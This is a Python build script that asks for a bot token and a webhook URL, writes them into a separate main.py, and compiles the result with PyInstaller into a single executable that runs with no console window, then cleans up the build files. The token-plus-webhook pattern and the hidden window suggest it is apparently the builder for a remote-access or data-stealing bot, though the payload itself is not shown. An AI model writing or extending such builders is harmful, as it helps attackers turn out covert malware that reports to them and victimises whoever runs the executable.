import os
import shutil
import subprocess

MAIN_SCRIPT_PATH = "main.py"
BUILT_SCRIPT_PATH = "built_main.py"
EXE_NAME = "built_main.exe"

def get_input_from_user():
    token = input("Enter your bot token: ")
    webhook_url = input("Enter your webhook URL: ")
    return token, webhook_url

def build_script():
    if not os.path.exists(MAIN_SCRIPT_PATH):
        print(f"❌ Error: {MAIN_SCRIPT_PATH} not found!")
        return

    token, webhook_url = get_input_from_user()

    with open(MAIN_SCRIPT_PATH, "r", encoding="utf-8") as file:
        script_content = file.read()

    script_content = script_content.replace("TOKEN = 'sex'", f"TOKEN = '{token}'")
    script_content = script_content.replace("WEBHOOK_URL = 'sex'", f"WEBHOOK_URL = '{webhook_url}'")

    with open(BUILT_SCRIPT_PATH, "w", encoding="utf-8") as file:
        file.write(script_content)

    print(f"✅ Built script saved as {BUILT_SCRIPT_PATH}")
    convert_to_exe()

def convert_to_exe():
    print("🚀 Converting to EXE...")
    try:
        subprocess.run(
            ["pyinstaller", "--onefile", "--noconsole", BUILT_SCRIPT_PATH],
            check=True
        )

        dist_path = os.path.join("dist", EXE_NAME)
        if os.path.exists(dist_path):
            shutil.move(dist_path, EXE_NAME)

        shutil.rmtree("build", ignore_errors=True)
        shutil.rmtree("dist", ignore_errors=True)
        os.remove(f"{BUILT_SCRIPT_PATH}.spec")

        print(f"✅ EXE created: {EXE_NAME}")
    except Exception as e:
        print(f"❌ Failed to create EXE: {e}")

if __name__ == "__main__":
    build_script()
